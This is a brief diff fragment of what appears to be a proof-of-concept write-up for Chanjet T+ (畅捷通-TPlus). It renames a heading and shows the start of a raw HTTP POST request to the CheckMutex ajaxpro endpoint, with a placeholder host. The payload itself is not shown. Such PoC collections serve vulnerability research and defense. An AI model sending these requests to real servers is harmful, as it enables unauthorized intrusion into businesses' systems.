@@ -6,7 +6,7 @@ app="畅捷通-TPlus"
 ```
 
 
-## poc
+## POC
 ```
 POST /tplus/ajaxpro/Ufida.T.SM.UIP.MultiCompanyController,Ufida.T.SM.UIP.ashx?method=CheckMutex HTTP/1.1
 Host: your-ip
